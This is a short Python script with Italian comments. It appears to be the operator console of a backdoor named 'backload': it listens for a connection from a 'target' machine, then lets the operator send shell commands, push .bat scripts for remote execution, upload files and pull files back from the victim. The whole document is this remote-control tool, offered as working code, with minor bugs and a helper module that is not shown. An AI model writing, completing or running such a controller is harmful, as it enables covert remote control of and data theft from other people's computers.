import os
import sys
import function
Connection = function.Connection()

#creazione socket
try:
    inizializzation = Connection.INIT_CONN()
    if inizializzation == False:
        print("[err] impossibile inizializzare il socket")
        sys.exit()
    else:
        print("[*] socket inizializzato\n[*] in attesa di connessione")
except:
    print("[err] impossibile inizializzare il socket")
    sys.exit()

#ascolto sulla porta
try:
    listen = Connection.LISTEN()
    if listen == False:
        print("[err] impossibile accogliere il client")
        sys.exit()
    else:
        print("[*] connessione stabilita con il targhet")
except:
    print("[err] impossibile accogliere il client")
    sys.exit()

#invio comandi
while True:
    command = input("backload> ")

    #lancio script .bat da remoto
    if command.split(" ")[0] == "runscript" and len(command.split(" ")) == 2:
        filecontent = None
        script = command.split(" ")[1]

        #apertura del file contenente lo script .bat
        try:
            filescript = open(script, "r")
            filecontent = filescript.read()
            filescript.close()

        except:
            print("[err] impossibile trovare il path dello script")

        #invio dello script
        if type(filecontent) != "<class 'str'>":
            Connection.SEND("scr" + filecontent)

    #invio file
    elif command.split(" ")[0] == "upload":
        fileopen = False

        #apertura file
        try:
            file = open(command.split(" ")[1], "rb")
            fileopen = True
        except:
            Connection.SEND("impossibile inviare il file richiesto")

        #invio file
        if fileopen == True:
            content = file.read()
            file.close()
            Connection.SEND(b'file$' + content)


    else:
        #invio comando
        try:
            Connection.SEND("com" + command)
        except:
            print("[err] connessione caduta")
            break
    response = Connection.RECV()

    if response != False:
        #recezione file
        if response.split(b'$')[0] == b'file':
            #apertura file
            file = open("download", "wb+")
            response = response.split(b'$')
            response.pop(0)
            payload = b''
            for index in response:
                payload = payload + index + b'$'
            payload = payload.decode("ascii", "ignore")
            payload = list(payload)
            payload.pop(-1)
            payload = "".join(payload).encode()
            #scrittura file
            file.write(payload)
            file.close()
            print("file ricevuto e salvato in 'download'")

        else:
            #output del payload
            try:
                print(response.decode("ascii", "ignore"))
            except:
                print("[err] impossibile mettere in output il messaggio ricevuto")
    else:
        print("errore di recezione")
        quit()